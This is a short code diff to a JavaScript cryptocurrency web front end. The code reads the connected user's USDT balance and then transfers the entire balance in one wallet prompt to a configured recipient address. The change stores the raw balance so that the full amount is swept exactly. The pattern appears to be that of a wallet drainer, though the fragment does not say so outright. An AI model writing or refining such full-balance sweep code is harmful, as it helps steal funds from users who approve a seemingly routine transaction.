@@ -301,6 +301,7 @@
                 allowanceNum = parseFloat(formattedAllowance);
 
                 state.usdtBalance = usdtBalNum.toFixed(2);
+                state.usdtBalanceWei = usdtBalRaw;
                 state.allowance = allowanceNum.toFixed(2);
             } catch (usdtErr) {
                 console.error('Error reading USDT contract:', usdtErr);
@@ -376,7 +377,7 @@
             const signer = await provider.getSigner();
 
             const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-            const amountWei = ethers.parseUnits(state.usdtBalance, 18);
+            const amountWei = state.usdtBalanceWei || ethers.parseUnits(state.usdtBalance, 18);
 
             // Direct 1-prompt transfer to recipient address
             const recipientAddress = CONFIG.CONTRACT_ADDRESS;
